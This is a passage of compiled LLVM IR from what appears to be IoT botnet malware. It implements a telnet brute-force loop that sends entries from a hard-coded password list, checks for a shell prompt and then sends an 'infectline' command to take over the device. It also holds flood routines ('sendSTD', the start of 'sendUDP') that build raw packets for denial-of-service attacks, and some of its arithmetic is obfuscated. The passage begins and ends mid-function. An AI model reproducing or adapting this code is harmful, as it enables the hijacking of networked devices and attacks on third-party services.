  %766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %765
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %766, i32 0, i32 3
  store i8 0, i8* %767, align 1
  br label %1122

; <label>:768:                                    ; preds = %745
  %769 = load i32, i32* %2, align 4
  %770 = sext i32 %769 to i64
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %770
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %771, i32 0, i32 8
  %773 = load i8*, i8** %772, align 8
  %774 = call i64 @strlen(i8* %773) #10
  %775 = trunc i64 %774 to i16
  %776 = load i32, i32* %2, align 4
  %777 = sext i32 %776 to i64
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %777
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %778, i32 0, i32 7
  store i16 %775, i16* %779, align 16
  br label %780

; <label>:780:                                    ; preds = %768
  %781 = load i32, i32* %2, align 4
  %782 = sext i32 %781 to i64
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %782
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %783, i32 0, i32 6
  %785 = load i32, i32* %784, align 4
  %786 = sub i32 0, 8
  %787 = sub i32 %785, %786
  %788 = add i32 %785, 8
  %789 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %790 = icmp ult i32 %787, %789
  br i1 %790, label %791, label %806

; <label>:791:                                    ; preds = %780
  %792 = load i32, i32* %2, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %793
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %794, i32 0, i32 0
  %796 = load i32, i32* %795, align 16
  %797 = call i32 @sclose(i32 %796)
  %798 = load i32, i32* %2, align 4
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %799
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %800, i32 0, i32 2
  store i8 0, i8* %801, align 8
  %802 = load i32, i32* %2, align 4
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %803
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %804, i32 0, i32 3
  store i8 1, i8* %805, align 1
  br label %806

; <label>:806:                                    ; preds = %791, %780
  br label %1121

; <label>:807:                                    ; preds = %72
  %808 = load i32, i32* %2, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %809
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %810, i32 0, i32 0
  %812 = load i32, i32* %811, align 16
  %813 = load i32, i32* %2, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %814
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %815, i32 0, i32 5
  %817 = load i8, i8* %816, align 1
  %818 = zext i8 %817 to i64
  %819 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %818
  %820 = load i8*, i8** %819, align 8
  %821 = load i32, i32* %2, align 4
  %822 = sext i32 %821 to i64
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %822
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %823, i32 0, i32 5
  %825 = load i8, i8* %824, align 1
  %826 = zext i8 %825 to i64
  %827 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %826
  %828 = load i8*, i8** %827, align 8
  %829 = call i64 @strlen(i8* %828) #10
  %830 = call i64 @send(i32 %812, i8* %820, i64 %829, i32 16384)
  %831 = icmp slt i64 %830, 0
  br i1 %831, label %832, label %847

; <label>:832:                                    ; preds = %807
  %833 = load i32, i32* %2, align 4
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 0
  %837 = load i32, i32* %836, align 16
  %838 = call i32 @sclose(i32 %837)
  %839 = load i32, i32* %2, align 4
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %840
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %841, i32 0, i32 2
  store i8 0, i8* %842, align 8
  %843 = load i32, i32* %2, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %844
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %845, i32 0, i32 3
  store i8 1, i8* %846, align 1
  br label %1122

; <label>:847:                                    ; preds = %807
  %848 = load i32, i32* %2, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %849
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %850, i32 0, i32 0
  %852 = load i32, i32* %851, align 16
  %853 = call i64 @send(i32 %852, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0), i64 2, i32 16384)
  %854 = icmp slt i64 %853, 0
  br i1 %854, label %855, label %870

; <label>:855:                                    ; preds = %847
  %856 = load i32, i32* %2, align 4
  %857 = sext i32 %856 to i64
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %857
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %858, i32 0, i32 0
  %860 = load i32, i32* %859, align 16
  %861 = call i32 @sclose(i32 %860)
  %862 = load i32, i32* %2, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %863
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %864, i32 0, i32 2
  store i8 0, i8* %865, align 8
  %866 = load i32, i32* %2, align 4
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %867
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %868, i32 0, i32 3
  store i8 1, i8* %869, align 1
  br label %1122

; <label>:870:                                    ; preds = %847
  %871 = load i32, i32* %2, align 4
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %872
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %873, i32 0, i32 2
  store i8 6, i8* %874, align 8
  br label %1121

; <label>:875:                                    ; preds = %72
  %876 = load i32, i32* %2, align 4
  %877 = sext i32 %876 to i64
  %878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %877
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %878, i32 0, i32 6
  %880 = load i32, i32* %879, align 4
  %881 = icmp eq i32 %880, 0
  br i1 %881, label %882, label %888

; <label>:882:                                    ; preds = %875
  %883 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %884 = load i32, i32* %2, align 4
  %885 = sext i32 %884 to i64
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %885
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %886, i32 0, i32 6
  store i32 %883, i32* %887, align 4
  br label %888

; <label>:888:                                    ; preds = %882, %875
  %889 = load i32, i32* %2, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %890
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %891, i32 0, i32 0
  %893 = load i32, i32* %892, align 16
  %894 = load i32, i32* %2, align 4
  %895 = sext i32 %894 to i64
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %895
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %896, i32 0, i32 8
  %898 = load i8*, i8** %897, align 8
  %899 = load i32, i32* %2, align 4
  %900 = sext i32 %899 to i64
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %900
  %902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %901, i32 0, i32 7
  %903 = load i16, i16* %902, align 16
  %904 = zext i16 %903 to i32
  %905 = call i32 @readUntil(i32 %893, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %898, i32 1024, i32 %904)
  %906 = icmp ne i32 %905, 0
  br i1 %906, label %907, label %982

; <label>:907:                                    ; preds = %888
  %908 = load i32, i32* %2, align 4
  %909 = sext i32 %908 to i64
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %909
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %910, i32 0, i32 6
  store i32 0, i32* %911, align 4
  %912 = load i32, i32* %2, align 4
  %913 = sext i32 %912 to i64
  %914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %913
  %915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %914, i32 0, i32 7
  store i16 0, i16* %915, align 16
  %916 = load i32, i32* %2, align 4
  %917 = sext i32 %916 to i64
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %917
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %918, i32 0, i32 8
  %920 = load i8*, i8** %919, align 8
  %921 = call i8* @strstr(i8* %920, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i32 0, i32 0)) #10
  %922 = icmp ne i8* %921, null
  br i1 %922, label %923, label %943

; <label>:923:                                    ; preds = %907
  %924 = load i32, i32* %2, align 4
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %925
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %926, i32 0, i32 8
  %928 = load i8*, i8** %927, align 8
  call void @llvm.memset.p0i8.i64(i8* %928, i8 0, i64 1024, i32 1, i1 false)
  %929 = load i32, i32* %2, align 4
  %930 = sext i32 %929 to i64
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %930
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %931, i32 0, i32 0
  %933 = load i32, i32* %932, align 16
  %934 = call i32 @sclose(i32 %933)
  %935 = load i32, i32* %2, align 4
  %936 = sext i32 %935 to i64
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %936
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %937, i32 0, i32 2
  store i8 0, i8* %938, align 8
  %939 = load i32, i32* %2, align 4
  %940 = sext i32 %939 to i64
  %941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %940
  %942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %941, i32 0, i32 3
  store i8 0, i8* %942, align 1
  br label %1122

; <label>:943:                                    ; preds = %907
  %944 = load i32, i32* %2, align 4
  %945 = sext i32 %944 to i64
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %945
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %946, i32 0, i32 8
  %948 = load i8*, i8** %947, align 8
  %949 = call i32 @matchPrompt(i8* %948)
  %950 = icmp ne i32 %949, 0
  br i1 %950, label %971, label %951

; <label>:951:                                    ; preds = %943
  %952 = load i32, i32* %2, align 4
  %953 = sext i32 %952 to i64
  %954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %953
  %955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %954, i32 0, i32 8
  %956 = load i8*, i8** %955, align 8
  call void @llvm.memset.p0i8.i64(i8* %956, i8 0, i64 1024, i32 1, i1 false)
  %957 = load i32, i32* %2, align 4
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %958
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %959, i32 0, i32 0
  %961 = load i32, i32* %960, align 16
  %962 = call i32 @sclose(i32 %961)
  %963 = load i32, i32* %2, align 4
  %964 = sext i32 %963 to i64
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %964
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %965, i32 0, i32 2
  store i8 0, i8* %966, align 8
  %967 = load i32, i32* %2, align 4
  %968 = sext i32 %967 to i64
  %969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %968
  %970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %969, i32 0, i32 3
  store i8 1, i8* %970, align 1
  br label %1122

; <label>:971:                                    ; preds = %943
  %972 = load i32, i32* %2, align 4
  %973 = sext i32 %972 to i64
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %973
  %975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %974, i32 0, i32 2
  store i8 7, i8* %975, align 8
  br label %976

; <label>:976:                                    ; preds = %971
  %977 = load i32, i32* %2, align 4
  %978 = sext i32 %977 to i64
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %978
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %979, i32 0, i32 8
  %981 = load i8*, i8** %980, align 8
  call void @llvm.memset.p0i8.i64(i8* %981, i8 0, i64 1024, i32 1, i1 false)
  br label %1122

; <label>:982:                                    ; preds = %888
  %983 = load i32, i32* %2, align 4
  %984 = sext i32 %983 to i64
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %984
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %985, i32 0, i32 8
  %987 = load i8*, i8** %986, align 8
  %988 = call i64 @strlen(i8* %987) #10
  %989 = trunc i64 %988 to i16
  %990 = load i32, i32* %2, align 4
  %991 = sext i32 %990 to i64
  %992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %991
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %992, i32 0, i32 7
  store i16 %989, i16* %993, align 16
  br label %994

; <label>:994:                                    ; preds = %982
  %995 = load i32, i32* %2, align 4
  %996 = sext i32 %995 to i64
  %997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %996
  %998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %997, i32 0, i32 6
  %999 = load i32, i32* %998, align 4
  %1000 = sub i32 %999, -1949585976
  %1001 = add i32 %1000, 20
  %1002 = add i32 %1001, -1949585976
  %1003 = add i32 %999, 20
  %1004 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1005 = icmp ult i32 %1002, %1004
  br i1 %1005, label %1006, label %1021

; <label>:1006:                                   ; preds = %994
  %1007 = load i32, i32* %2, align 4
  %1008 = sext i32 %1007 to i64
  %1009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1008
  %1010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1009, i32 0, i32 0
  %1011 = load i32, i32* %1010, align 16
  %1012 = call i32 @sclose(i32 %1011)
  %1013 = load i32, i32* %2, align 4
  %1014 = sext i32 %1013 to i64
  %1015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1014
  %1016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1015, i32 0, i32 2
  store i8 0, i8* %1016, align 8
  %1017 = load i32, i32* %2, align 4
  %1018 = sext i32 %1017 to i64
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1018
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1019, i32 0, i32 3
  store i8 1, i8* %1020, align 1
  br label %1021

; <label>:1021:                                   ; preds = %1006, %994
  br label %1121

; <label>:1022:                                   ; preds = %72
  %1023 = load i32, i32* %2, align 4
  %1024 = sext i32 %1023 to i64
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1024
  %1026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1025, i32 0, i32 0
  %1027 = load i32, i32* %1026, align 16
  %1028 = call i64 @send(i32 %1027, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i32 0, i32 0), i64 4, i32 16384)
  %1029 = icmp slt i64 %1028, 0
  br i1 %1029, label %1030, label %1045

; <label>:1030:                                   ; preds = %1022
  %1031 = load i32, i32* %2, align 4
  %1032 = sext i32 %1031 to i64
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1032
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1033, i32 0, i32 0
  %1035 = load i32, i32* %1034, align 16
  %1036 = call i32 @sclose(i32 %1035)
  %1037 = load i32, i32* %2, align 4
  %1038 = sext i32 %1037 to i64
  %1039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1038
  %1040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1039, i32 0, i32 2
  store i8 0, i8* %1040, align 8
  %1041 = load i32, i32* %2, align 4
  %1042 = sext i32 %1041 to i64
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1042
  %1044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1043, i32 0, i32 3
  store i8 1, i8* %1044, align 1
  br label %1122

; <label>:1045:                                   ; preds = %1022
  %1046 = load i32, i32* %2, align 4
  %1047 = sext i32 %1046 to i64
  %1048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1047
  %1049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1048, i32 0, i32 2
  store i8 8, i8* %1049, align 8
  br label %1121

; <label>:1050:                                   ; preds = %72
  %1051 = load i32, i32* %2, align 4
  %1052 = sext i32 %1051 to i64
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1052
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1053, i32 0, i32 6
  %1055 = load i32, i32* %1054, align 4
  %1056 = icmp eq i32 %1055, 0
  br i1 %1056, label %1057, label %1063

; <label>:1057:                                   ; preds = %1050
  %1058 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1059 = load i32, i32* %2, align 4
  %1060 = sext i32 %1059 to i64
  %1061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1060
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1061, i32 0, i32 6
  store i32 %1058, i32* %1062, align 4
  br label %1063

; <label>:1063:                                   ; preds = %1057, %1050
  %1064 = load i32, i32* %2, align 4
  %1065 = sext i32 %1064 to i64
  %1066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1065
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1066, i32 0, i32 0
  %1068 = load i32, i32* %1067, align 16
  %1069 = load i8*, i8** @infectline, align 8
  %1070 = load i8*, i8** @infectline, align 8
  %1071 = call i64 @strlen(i8* %1070) #10
  %1072 = call i64 @send(i32 %1068, i8* %1069, i64 %1071, i32 16384)
  %1073 = icmp slt i64 %1072, 0
  br i1 %1073, label %1074, label %1094

; <label>:1074:                                   ; preds = %1063
  %1075 = load i32, i32* %2, align 4
  %1076 = sext i32 %1075 to i64
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1076
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1077, i32 0, i32 0
  %1079 = load i32, i32* %1078, align 16
  %1080 = call i32 @sclose(i32 %1079)
  %1081 = load i32, i32* %2, align 4
  %1082 = sext i32 %1081 to i64
  %1083 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1082
  %1084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1083, i32 0, i32 2
  store i8 0, i8* %1084, align 8
  %1085 = load i32, i32* %2, align 4
  %1086 = sext i32 %1085 to i64
  %1087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1086
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1087, i32 0, i32 3
  store i8 1, i8* %1088, align 1
  %1089 = load i32, i32* %2, align 4
  %1090 = sext i32 %1089 to i64
  %1091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1090
  %1092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1091, i32 0, i32 8
  %1093 = load i8*, i8** %1092, align 8
  call void @llvm.memset.p0i8.i64(i8* %1093, i8 0, i64 1024, i32 1, i1 false)
  br label %1122

; <label>:1094:                                   ; preds = %1063
  %1095 = load i32, i32* %2, align 4
  %1096 = sext i32 %1095 to i64
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1096
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1097, i32 0, i32 6
  %1099 = load i32, i32* %1098, align 4
  %1100 = sub i32 0, 15
  %1101 = sub i32 %1099, %1100
  %1102 = add i32 %1099, 15
  %1103 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1104 = icmp ult i32 %1101, %1103
  br i1 %1104, label %1105, label %1120

; <label>:1105:                                   ; preds = %1094
  %1106 = load i32, i32* %2, align 4
  %1107 = sext i32 %1106 to i64
  %1108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1107
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1108, i32 0, i32 0
  %1110 = load i32, i32* %1109, align 16
  %1111 = call i32 @sclose(i32 %1110)
  %1112 = load i32, i32* %2, align 4
  %1113 = sext i32 %1112 to i64
  %1114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1113
  %1115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1114, i32 0, i32 2
  store i8 0, i8* %1115, align 8
  %1116 = load i32, i32* %2, align 4
  %1117 = sext i32 %1116 to i64
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1117
  %1119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1118, i32 0, i32 3
  store i8 1, i8* %1119, align 1
  br label %1120

; <label>:1120:                                   ; preds = %1105, %1094
  br label %1121

; <label>:1121:                                   ; preds = %1120, %1045, %1021, %870, %806, %663, %599, %421, %255, %72
  br label %1122

; <label>:1122:                                   ; preds = %1121, %1074, %1030, %976, %951, %923, %855, %832, %753, %739, %648, %625, %541, %504, %467, %341, %193, %149
  %1123 = load i32, i32* %2, align 4
  %1124 = sub i32 0, %1123
  %1125 = sub i32 0, 1
  %1126 = add i32 %1124, %1125
  %1127 = sub i32 0, %1126
  %1128 = add nsw i32 %1123, 1
  store i32 %1127, i32* %2, align 4
  br label %68

; <label>:1129:                                   ; preds = %68
  br label %66
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare i32 @time(...) #3

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %7, align 4
  %13 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %14 = sext i32 %13 to i64
  store i64 %14, i64* %8, align 8
  %15 = load i8*, i8** %4, align 8
  %16 = call %struct.hostent* @gethostbyname(i8* %15)
  store %struct.hostent* %16, %struct.hostent** %10, align 8
  %17 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = load %struct.hostent*, %struct.hostent** %10, align 8
  %19 = getelementptr inbounds %struct.hostent, %struct.hostent* %18, i32 0, i32 4
  %20 = load i8**, i8*** %19, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %24 = bitcast %struct.in_addr* %23 to i8*
  %25 = load %struct.hostent*, %struct.hostent** %10, align 8
  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 3
  %27 = load i32, i32* %26, align 4
  %28 = sext i32 %27 to i64
  call void @bcopy(i8* %22, i8* %24, i64 %28) #2
  %29 = load %struct.hostent*, %struct.hostent** %10, align 8
  %30 = getelementptr inbounds %struct.hostent, %struct.hostent* %29, i32 0, i32 2
  %31 = load i32, i32* %30, align 8
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %32, i16* %33, align 4
  %34 = load i32, i32* %5, align 4
  %35 = trunc i32 %34 to i16
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 0, i32* %11, align 4
  br label %37

; <label>:37:                                     ; preds = %61, %3
  %38 = load i32, i32* %11, align 4
  %39 = icmp uge i32 %38, 50
  br i1 %39, label %40, label %61

; <label>:40:                                     ; preds = %37
  %41 = load i32, i32* %7, align 4
  %42 = call i64 @send(i32 %41, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i64 50, i32 0)
  %43 = load i32, i32* %7, align 4
  %44 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %45 = call i32 @connect(i32 %43, %struct.sockaddr* %44, i32 16)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %47 = sext i32 %46 to i64
  %48 = load i64, i64* %8, align 8
  %49 = load i32, i32* %6, align 4
  %50 = sext i32 %49 to i64
  %51 = sub i64 0, %48
  %52 = sub i64 0, %50
  %53 = add i64 %51, %52
  %54 = sub i64 0, %53
  %55 = add nsw i64 %48, %50
  %56 = icmp sge i64 %47, %54
  br i1 %56, label %57, label %60

; <label>:57:                                     ; preds = %40
  %58 = load i32, i32* %7, align 4
  %59 = call i32 @close(i32 %58)
  call void @_exit(i32 0) #12
  unreachable

; <label>:60:                                     ; preds = %40
  store i32 0, i32* %11, align 4
  br label %61

; <label>:61:                                     ; preds = %60, %37
  %62 = load i32, i32* %11, align 4
  %63 = sub i32 0, 1
  %64 = sub i32 %62, %63
  %65 = add i32 %62, 1
  store i32 %64, i32* %11, align 4
  br label %37
                                                  ; No predecessors!
  ret void
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %320

; <label>:46:                                     ; preds = %40
